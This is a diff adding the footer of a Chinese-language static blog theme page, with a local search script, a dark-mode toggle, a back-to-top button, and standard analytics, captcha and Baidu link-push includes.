+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
